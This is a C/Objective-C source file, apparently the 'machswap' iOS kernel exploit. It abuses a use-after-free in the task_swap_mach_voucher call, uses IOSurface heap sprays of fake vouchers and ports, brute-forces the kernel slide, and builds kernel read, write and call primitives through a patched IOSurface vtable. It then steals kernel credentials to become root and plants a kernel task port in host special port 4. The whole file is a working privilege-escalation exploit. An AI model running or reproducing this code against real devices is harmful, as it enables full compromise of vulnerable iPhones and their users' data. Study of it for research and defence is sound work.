#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror
#include <unistd.h>             // usleep, setuid, getuid
#include <pthread.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <CoreFoundation/CoreFoundation.h>

#import <Foundation/Foundation.h>

#include "common.h"             // LOG, uint64_t
#include "machswap_pwn.h"
#include "iokit.h"

extern kern_return_t bootstrap_look_up(mach_port_t bp, char *name, mach_port_t *sp);
extern mach_port_t mach_reply_port(void);
extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);
extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
extern kern_return_t mach_vm_protect(task_t task, mach_vm_address_t addr, mach_vm_size_t size, boolean_t set_max, vm_prot_t new_prot);
extern kern_return_t mach_vm_map(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur, vm_prot_t max, vm_inherit_t inheritance);
extern kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);


// ********** ********** ********** constants ********** ********** **********

static const uint64_t IOSURFACE_CREATE_SURFACE =  0;
static const uint64_t IOSURFACE_SET_VALUE      =  9;
static const uint64_t IOSURFACE_GET_VALUE      = 10;
static const uint64_t IOSURFACE_DELETE_VALUE   = 11;

// ********** ********** ********** helpers ********** ********** **********

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

// ********** ********** ********** MIG ********** ********** **********

struct simple_msg
{
  mach_msg_header_t hdr;
  char buf[0];
};

/* credits to ian beer */
static mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size)
{
    // allocate a port to send the messages to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to allocate port\n");
        exit(EXIT_FAILURE);
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to increase queue limit\n");
        exit(EXIT_FAILURE);
    }

    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);

    for (int i = 0; i < 256; i++) 
    {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;

        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);

        if (err != KERN_SUCCESS) 
        {
            printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            exit(EXIT_FAILURE);
        }
    }

    return q;
}

static uint32_t message_size_for_kalloc_size(uint32_t size)
{
    return ((size * 3) / 4) - 0x74;
}

static void trigger_gc_please()
{
    // size = 100 * 16,384 * 256 = 419,430,400 = ~420mb (max)

    const int gc_ports_cnt = 100;
    int gc_ports_max = gc_ports_cnt;
    mach_port_t gc_ports[gc_ports_cnt] = { 0 };
    
    uint32_t body_size = message_size_for_kalloc_size(16384) - sizeof(mach_msg_header_t); // 1024
    uint8_t *body = malloc(body_size);
    memset(body, 0x41, body_size);
    
    for (int i = 0; i < gc_ports_cnt; i++)
    {
        uint64_t t0, t1;

        t0 = mach_absolute_time();
        gc_ports[i] = send_kalloc_message(body, body_size);
        t1 = mach_absolute_time();

        /* 
            this won't necessarily get triggered on newer/faster devices (ie. >=A9)
            this is mainly designed for older devices (in my case, A7) where spraying
            such a large amount of data is a painful process 
            the idea here is to look for a longer spray which signals that GC may have
            taken place
        */
        if (t1 - t0 > 1000000)
        {
            LOG("got gc at %d -- breaking", i);
            gc_ports_max = i;
            break;
        }
    }

    for (int i = 0; i < gc_ports_max; i++)
    {
        mach_port_destroy(mach_task_self(), gc_ports[i]);
    }

    sched_yield();
    sleep(1);
}

// ********** ********** ********** data structures ********** ********** **********

#define IO_BITS_ACTIVE      0x80000000
#define IOT_PORT            0
#define IKOT_TASK           2
#define IKOT_CLOCK          25
#define IKOT_IOKIT_CONNECT  29

typedef volatile struct 
{
    /* 0x00 */ uint32_t iv_hash;
    /* 0x04 */ uint32_t iv_sum;
    /* 0x08 */ uint32_t iv_refs;
    /* 0x0c */ uint32_t iv_table_size;
    /* 0x10 */ uint32_t iv_inline_table[6];
    /* 0x28 */ uint64_t padding0;
    /* 0x30 */ uint64_t iv_table;
    /* 0x38 */ uint64_t iv_port;
    /* 0x40 */ uint64_t iv_hash_link_next;
    /* 0x48 */ uint64_t iv_hash_link_prev;
} fake_ipc_voucher_t;

typedef volatile struct 
{
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
                    type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

// ********** ********** ********** ye olde pwnage ********** ********** **********

static kern_return_t   (^kcall)            (uint64_t, int, ...);
static void            (^kreadbuf)         (uint64_t, void *, size_t);
static uint32_t        (^kread32)          (uint64_t);
static uint64_t        (^kread64)          (uint64_t);
static void            (^kwritebuf)        (uint64_t, void *, size_t);
static void            (^kwrite32)         (uint64_t, uint32_t);
static void            (^kwrite64)         (uint64_t, uint64_t);
static uint64_t        (^zonemap_fix_addr) (uint64_t);

kern_return_t machswap_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_back)
{
    kern_return_t ret = KERN_SUCCESS;

    io_connect_t client = MACH_PORT_NULL;
    mach_vm_size_t pagesize = 0;
    
    mach_port_t before[0x2000] = { };
    mach_port_t after[0x1000] = { };

    /********** ********** data hunting ********** **********/

    vm_size_t pgsz = 0;
    ret = _host_page_size(mach_host_self(), &pgsz);
    pagesize = pgsz;
    LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to get page size! ret: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(service))
    {
        LOG("failed to find IOSurfaceRoot service");
        ret = KERN_FAILURE;
        goto out;
    }

    ret = IOServiceOpen(service, mach_task_self(), 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if (ret != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        LOG("failed to open an IOSurface client: %x (%s)", ret, mach_error_string(ret));
        goto out;
    }

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };

    typedef struct 
    {
        mach_vm_address_t addr1;
        mach_vm_address_t addr2;
        mach_vm_address_t addr3;
        uint32_t id;
    } surface_t;

    size_t size = offsets->iosurface.create_outsize;
    surface_t *surface = malloc(size);
    bzero(surface, size);

    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), surface, &size);
    if (ret != KERN_SUCCESS)
    {
        LOG("IOSURFACE_CREATE_SURFACE failed: %x (%s)", ret, mach_error_string(ret));
        goto out;
    }

    /* on 11.x the surface_t->addr3 entry doesn't exist */
    if (surface->id == 0x0)
    {
        surface->id = (uint32_t)surface->addr3;
    }
    LOG("surface ID: 0x%x", surface->id);

    if (surface->id == 0x0)
    {
        LOG("failed to create an IOSurface! id was 0");
        ret = KERN_FAILURE;
        goto out;
    }

    /********** ********** black magic ********** **********/

    /* 
        set up fakeport for later
        we'll spray the address of this port after we trigger the uaf
    */
    kport_t *fakeport = malloc(0x4000);
    mlock((void *)fakeport, 0x4000);
    bzero((void *)fakeport, 0x4000);
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 100;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    fakeport->ip_srights = 99;
     
    LOG("fakeport: 0x%llx", (uint64_t)fakeport);

    /* the fake voucher to be sprayed */
    fake_ipc_voucher_t fake_voucher = (fake_ipc_voucher_t)
    {
        .iv_hash = 0x11111111,
        .iv_sum = 0x22222222,
        .iv_refs = 100,
        .iv_port = (uint64_t)fakeport
    };
    
    /* set up our IOSurface data for spraying */
#define FILL_MEMSIZE 0x4000000
    int spray_qty = FILL_MEMSIZE / pagesize; // # of pages to spray
    
    int spray_size = (int)((5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pagesize)));
    uint32_t *spray_data = malloc(spray_size); // header + (spray_qty * (item_header + pgsize))
    bzero((void *)spray_data, spray_size);
    
    uint32_t *spray_cur = spray_data;
    
    *(spray_cur++) = surface->id;
    *(spray_cur++) = 0x0;
    *(spray_cur++) = kOSSerializeMagic;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_qty;
    for (int i = 0; i < spray_qty; i++)
    {
        *(spray_cur++) = kOSSerializeSymbol | 5;
        *(spray_cur++) = transpose(i);
        *(spray_cur++) = 0x0;
        *(spray_cur++) = (uint32_t)((i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1));
        
        for (uintptr_t ptr = (uintptr_t)spray_cur, end = ptr + pagesize; 
             ptr + sizeof(fake_ipc_voucher_t) <= end; 
             ptr += sizeof(fake_ipc_voucher_t))
        {
            bcopy((const void *)&fake_voucher, (void *)ptr, sizeof(fake_ipc_voucher_t));
        }
        
        spray_cur += (pagesize / sizeof(uint32_t));
    }

    /* create a few vouchers used to trigger the bug */
    mach_voucher_attr_recipe_data_t atm_data = 
    {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };

    mach_port_t p2;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
    
    mach_port_t p3;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);

    /* allocate 0x2000 vouchers to alloc some new fresh pages */
    for (int i = 0; i < 0x2000; i++)
    {
        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
    }
    
    /* alloc our target uaf voucher */
    mach_port_t p1;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
    
    /* allocate 0x1000 more vouchers */
    for (int i = 0; i < 0x1000; i++)
    {
        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
    }

    /*
        theoretically, we should now have 3 blocks of memory (roughly) as so:
        |-----------------------|-------------|------------------|
        |     0x2000 ports      | target port |   0x1000 ports   |
        |-----------------------|-------------|------------------| 
                                ^             ^
                                page with only our controlled ports
        hopefully our target port is now allocated on a page which contains only our 
        controlled ports. this means when we release all of our ports *all* allocations
        on the given page will be released, and when we trigger GC the page will be released
        back from the ipc_ports zone to be re-used by kalloc 
        this allows us to spray our fake vouchers via IOSurface in other kalloc zones 
        (ie. kalloc.1024), and the dangling pointer of the voucher will then overlap with one
        of our allocations
    */
    
    /* set up to trigger the bug */
    ret = thread_set_mach_voucher(mach_thread_self(), p1);
    
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p2);
    
    /* here we go! release the 0x1000 ports allocated after our target */
    for (int i = 0; i < 0x1000; i++)
    {
        mach_port_destroy(mach_task_self(), after[i]);
    }
    
    /* now release our target port viat he uaf */
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p3);
    
    /* release the 0x2000 ports allocated before our target */
    for (int i = 0; i < 0x2000; i++)
    {
        mach_port_destroy(mach_task_self(), before[i]);
    }
    
    /* 
        hopefully the page which contained our uaf port is now completely
        free of allocations, and we can trigger gc to release the page to 
        allow for reallocation into another kalloc zone
    */
    trigger_gc_please();
    
    /* spray our data via IOSurface */
    uint32_t dummy = 0;
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, spray_data, spray_size, &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("setValue(prep): %s", mach_error_string(ret));
        goto out;
    }
    
    mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
    
    /* fingers crossed we get a userland handle onto our 'fakeport' object */
    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);

    LOG("port: %x", real_port_to_fake_voucher);
    
    /* things are looking good; should be 100% success rate from here */
    LOG("WE REALLY POSTED UP ON THIS BLOCK");
    
    mach_port_t the_one = real_port_to_fake_voucher;
    
    uint64_t textbase = offsets->data.system_clock;
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    fakeport->ip_references = 0xff;

    /* 
        the slide will always have a minimum value of 0x1000000 and 
        intervals of 0x200000. according to iphonewiki it is calculated as so:
        slide = 0x1000000 + (slide_byte * 0x200000)
        where slide byte is a value between 0x0 and 0xff
        if slide_byte=0x0 then a hardcoded value of 0x21000000 is used
    */

#define KSLIDE_BASE     0x1000000
#define KSLIDE_INTERVAL 0x200000
#define KSLIDE_LIMIT    KSLIDE_BASE + (KSLIDE_INTERVAL * 0x100)

    /* 
        find the slide via clock_sleep
        technique by esser I believe?
        I start from the system clock offset to make it *way* faster than without 
        (typically you would brute force the address, there was some algorithim help narrow
         down the possible values but this was broken at some point -- it's possible Apple
         changed the way the port was stored in __DATA so it was no longer predictable)
        note: i said "should be 100%"... this can fail sometimes; i'm not sure why 
        (clock_sleep_trap will sometimes return success even if it's not the right kslide)
    */
    uint64_t k = KSLIDE_BASE + KSLIDE_INTERVAL;
    while (k <= KSLIDE_LIMIT)
    {
        fakeport->ip_kobject = textbase + k;
        
        ret = clock_sleep_trap(the_one, 0, 0, 0, 0);
        
        if (ret != KERN_FAILURE)
        {
            LOG("got clock at: 0x%llx", textbase + k);
            goto gotclock;
        }
        
        k += KSLIDE_INTERVAL;
        
        if ((k % KSLIDE_BASE) == 0)
        {
            LOG("k = %llx...", k);
        }
    }

    /* if this fails, your system_clock offset is probably wrong */
    LOG("failed to find clock/kslide");
    goto out;

gotclock:;
    
    uint64_t kslide = k;
    uint64_t kernel_base = offsets->constant.kernel_image_base + kslide;
    LOG("kernel slide: 0x%llx", kslide);
    LOG("kernel base: 0x%llx", kernel_base);
    
    /* set our fakeport back to a TASK port and setup arbitrary read via pid_for_task */
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    
    /* fake task struct */
    ktask_t *fake_task = (ktask_t *)malloc(0x600); // task is about 0x568 or some shit
    bzero((void *)fake_task, 0x600);
    fake_task->ref_count = 0xff;
    
    LOG("faketask: 0x%llx", (uint64_t)fake_task);

    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_bsd_info);
    
    fakeport->ip_kobject = (uint64_t)fake_task;
    
#define rk32(addr, value)\
*read_addr_ptr = addr - offsets->struct_offsets.proc_pid;\
value = 0x0;\
ret = pid_for_task(the_one, (int *)&value);
    
    uint32_t read64_tmp;
    
    /* rk64 performs two 32bit reads and combines them into a single uint64 */
#define rk64(addr, value)\
rk32(addr + 0x4, read64_tmp);\
rk32(addr, value);\
value = value | ((uint64_t)read64_tmp << 32)

    /* try and read our kbase to make sure our read is working properly */
    uint32_t kbase_value = 0x0;
    rk32(kernel_base, kbase_value);
    if (kbase_value != MH_MAGIC_64)
    {
        LOG("failed to find kernel base: %x", kbase_value);
        goto out;
    }
    LOG("read kernel base value: %x", kbase_value);

    uint64_t kernproc_offset = offsets->data.kernproc + kslide;

    /* 
        kernproc is an offset which finds the kernel's proc_t struct     
        this gives us a great entry into a linked list of all proc
        structs in the kernel 
    */
    uint64_t kernproc;
    rk64(kernproc_offset, kernproc);
    LOG("got kernproc: 0x%llx", kernproc);
    
    uint64_t proc = kernproc;
    
    LOG("searching for our proc (%d)...", getpid());
    
    /* find our proc_t struct */
    while (proc)
    {
        uint32_t found_pid;
        rk32(proc + offsets->struct_offsets.proc_pid, found_pid); 
        if (found_pid == getpid())
        {
            break;
        }
        
        rk64(proc + 0x8, proc); // proc->p_list->le_prev
        if (proc == 0x0)
        {
            LOG("failed to get next proc");
            goto out;
        }
    }
    
    uint64_t ourproc = proc;
    LOG("got ourproc 0x%llx", ourproc);
    
    uint64_t ourtask;
    rk64(ourproc + offsets->struct_offsets.proc_task, ourtask);
    LOG("got ourtask: 0x%llx", ourtask);
    
    /* 
        register the IOSurfaceRootUserClient port onto our task
        this will store a pointer to the kernel ipc_port within
        task_t->itk_registered[0]
    */ 
    mach_ports_register(mach_task_self(), &client, 1);
    
    // joker -m kernel | grep mach_ports_lookup
    // look for 3 func calls one after another
    // 3 offsets (ie. 0x2e8, 0x2f0, 0x2f8)
    // these are task->itk_registered[0,1,2]
    uint64_t itk_registered;
    rk64(ourtask + offsets->struct_offsets.task_itk_registered, itk_registered);
    LOG("itk_registered: 0x%llx", itk_registered);

    uint64_t ip_kobject;
    rk64(itk_registered + offsetof(kport_t, ip_kobject), ip_kobject);
    LOG("ip_kobject: 0x%llx", ip_kobject);
    
    uint64_t ioruc_vtab;
    rk64(ip_kobject, ioruc_vtab);
    LOG("ioruc vtab: 0x%llx", ioruc_vtab);
    
    /* 
        once we find the object we can patch the vtable and set up an 
        arbitrary kernel call primitive via the IOSurfaceRoot user client 
    */

    uint64_t *iosurface_vtab = (uint64_t *)malloc(0xC0 * sizeof(uint64_t));
    LOG("iosurface_vtab: 0x%llx", (uint64_t)iosurface_vtab);
    
    /* copy out vtable into userland */
    for (int i = 0; i < 0xC0; i++)
    {
        uint64_t vtab_entry = 0x0;
        rk64(ioruc_vtab + (i * sizeof(uint64_t)), vtab_entry);
        iosurface_vtab[i] = vtab_entry;
    }
    
    /* patch getExternalTrapForIndex */
    iosurface_vtab[offsets->iosurface.get_external_trap_for_index] = offsets->funcs.csblob_get_cdhash + kslide;
    
    uint64_t *iosurface_client = (uint64_t *)malloc(0x200 * sizeof(uint64_t));
    LOG("iosurface_client: 0x%llx", (uint64_t)iosurface_client);
    
    /* copy out client into userland */
    for (int i = 0; i < 0x200; i++)
    {
        uint64_t client_entry = 0x0;
        rk64(ip_kobject + (i * sizeof(uint64_t)), client_entry);
        iosurface_client[i] = client_entry;
    }
    
    /* set client vtab to our fake vtab */
    *(uint64_t *)iosurface_client = (uint64_t)iosurface_vtab;
    
    /* set our fakeport back to an IOKit/UC port */
    fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT;
    fakeport->ip_kobject = (uint64_t)iosurface_client;
    
    /* define functions for kcall, kread, kwrite, based on our kcall primitive */
    kcall = ^(uint64_t addr, int n_args, ...)
    {
        if (n_args > 7)
        {
            LOG("no more than 7 args you cheeky fuck: 0x%llx %d", addr, n_args);
            return KERN_INVALID_ARGUMENT;
        }
        
        va_list ap;
        va_start(ap, n_args);
        
        uint64_t args[7] = { 0 };
        for (int i = 0; i < n_args; i++)
        {
            args[i] = va_arg(ap, uint64_t);
        }
        
        if (n_args == 0 ||
            args[0] == 0x0)
        {
            args[0] = 0x1;
        }
        
        *(uint64_t *)((uint64_t)iosurface_client + 0x40) = args[0];
        *(uint64_t *)((uint64_t)iosurface_client + 0x48) = addr + kslide;
        
        return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
    };
    
    /* 
        call the `add x0, x0, #0x40; ret` gadget with x0=0x20 to ensure our 
        primitive is working. this should return the result 0x60 (0x20+0x40)
    */
    uint32_t kcall_ret = kcall(offsets->funcs.csblob_get_cdhash, 1, 0x20);
    if (kcall_ret != 0x60)
    {
        LOG("kcall failed: %x", kcall_ret);
        ret = KERN_FAILURE;
        goto out;
    }
    
    kreadbuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets->funcs.copyout, 3, addr, buf, len);
    };
    
    kread32 = ^(uint64_t addr)
    {
        uint32_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };
    
    kread64 = ^(uint64_t addr)
    {
        uint64_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };
    
    kwritebuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets->funcs.copyin, 3, buf, addr, len);
    };
    
    kwrite32 = ^(uint64_t addr, uint32_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };
    
    kwrite64 = ^(uint64_t addr, uint64_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };
    
    /* no longer needed */
#undef rk32
#undef rk64

    LOG("kernel base read: 0x%llx", kread64(offsets->constant.kernel_image_base + kslide));
    LOG("kernel base read: 0x%llx", kread64(offsets->constant.kernel_image_base + kslide + 0x8));
    
    /* 
        our kcall primitive can only return a 32-bit integer, so for 
        64bit values we will need to look for them in the zonemap 
    */

    uint64_t zone_map_addr = kread64(offsets->data.zonemap + kslide);
    
    LOG("zone map: 0x%llx", zone_map_addr);
    
    typedef struct
    {
        uint64_t prev;
        uint64_t next;
        uint64_t start;
        uint64_t end;
    } kmap_hdr_t;
    
    kmap_hdr_t zm_hdr = { 0 };
    
    kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));
    
    LOG("zone start: 0x%llx", zm_hdr.start);
    LOG("zone end: 0x%llx", zm_hdr.end);
    
    uint64_t zm_size = zm_hdr.end - zm_hdr.start;
    LOG("zm_size: 0x%llx", zm_size);
    
    if (zm_size > 0x100000000)
    {
        LOG("zonemap too big");
        ret = KERN_FAILURE;
        goto out;
    }
    
    zonemap_fix_addr = ^(uint64_t addr)
    {
        uint64_t spelunk = (zm_hdr.start & 0xffffffff00000000) | (addr & 0xffffffff);
        return spelunk < zm_hdr.start ? spelunk + 0x100000000 : spelunk;
    };
    
    /* eleveate creds to kernel */
    
    uint64_t kern_ucred = kread64(kernproc + offsets->struct_offsets.proc_ucred);
    kwrite64(ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
    
    LOG("setuid: %d, uid: %d", setuid(0), getuid());
    if (getuid() != 0)
    {
        LOG("failed to elevate to root/kernel creds!");
        ret = KERN_FAILURE;
        goto out;
    }
    
    /* kernproc->task->vm_map */

    uint64_t kerntask = kread64(kernproc + offsets->struct_offsets.proc_task);
    LOG("got kerntask: 0x%llx", kerntask);

    uint64_t kernel_vm_map = kread64(kerntask + offsets->struct_offsets.task_vm_map);
    LOG("kernel_vm_map: 0x%llx", kernel_vm_map);

    /* 
        build a shitty tfp0 
    */

    /* allocate a buffer for the fake task in kernel */
    uint64_t fake_task_k = zonemap_fix_addr(kcall(offsets->funcs.kalloc_external, 1, 0x600));

    // kwrite64(new_port + offsetof(kport_t, ip_kobject), fake_task_k);

    /* build the task in userland */
    ktask_t *userland_task = (ktask_t *)malloc(0x600);
    bzero((void *)userland_task, 0x600);
    
    userland_task->lock.data = 0x0;
    userland_task->lock.type = 0x22;
    userland_task->ref_count = 100;
    userland_task->active = 1;
    userland_task->map = kernel_vm_map;
    *(uint32_t *)((uint64_t)userland_task + offsets->struct_offsets.task_itk_self) = 1;

    /* 
        task_info TASK_DYLD_INFO patch 
        this patch (credit @Siguza) allows you to provide tfp0 to the task_info
        API, and retreive some data from the kernel's task struct
        we use it for storing the kernel base and kernel slide values 
    */ 
    *(uint64_t *)((uint64_t)userland_task + offsets->struct_offsets.task_all_image_info_addr) = kernel_base;
    *(uint64_t *)((uint64_t)userland_task + offsets->struct_offsets.task_all_image_info_size) = kslide;

    /* copy it onto our buffer */
    kwritebuf(fake_task_k, (void *)userland_task, 0x600);

    free((void *)userland_task);

    /* 
        since our IOSurfaceRoot userclient is owned by kernel, the 
        ip_receiver field will point to kernel's ipc space 
    */ 
    uint64_t ipc_space_kernel = kread64(itk_registered + offsetof(kport_t, ip_receiver));
    LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);

    /* allocate a buffer for our fake kernel task port */
    uint64_t new_port = zonemap_fix_addr(kcall(offsets->funcs.kalloc_external, 1, 0x300));

    /* build our fake port struct */
    kport_t *uland_port = (kport_t *)malloc(0x300);
    bzero((void *)uland_port, 0x300);

    uland_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    uland_port->ip_references = 0xf00d;
    uland_port->ip_srights = 0xf00d;
    uland_port->ip_receiver = ipc_space_kernel;
    uland_port->ip_context = 0x1234;
    uland_port->ip_kobject = fake_task_k;
    
    /* copy it onto the port we just allocated */
    kwritebuf(new_port, (void *)uland_port, 0x300);

    free((void *)uland_port);
    
    /*
        host_get_special_port(4) patch
        allows the kernel task port to be accessed by any root process 
    */
    kwrite64(offsets->data.realhost + kslide + 0x10 + (sizeof(uint64_t) * 4), new_port);

    mach_port_t hsp4;
    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
    if (ret != KERN_SUCCESS ||
        !MACH_PORT_VALID(hsp4))
    {
        LOG("failed to set hsp4! error: %x %s, port: %x", ret, mach_error_string(ret), hsp4);
        goto out;   
    }

    /* test it */
    vm_offset_t data_out = 0x0;
    mach_msg_type_number_t out_size = 0x0;
    ret = mach_vm_read(hsp4, kernel_base, 0x20, &data_out, &out_size);
    if (ret != KERN_SUCCESS)
    {
        printf("failed read on kern base via tfp0: %x (%s)\n", ret, mach_error_string(ret));
        goto out;
    }

    /* we're done! */
    LOG("tfp0 achieved!");
    LOG("base: 0x%llx", *(uint64_t *)data_out);
    LOG("Success!");

    *tfp0_back = hsp4;
    *kbase_back = kernel_base;
    ret = KERN_SUCCESS;

out:;
    return ret;
}
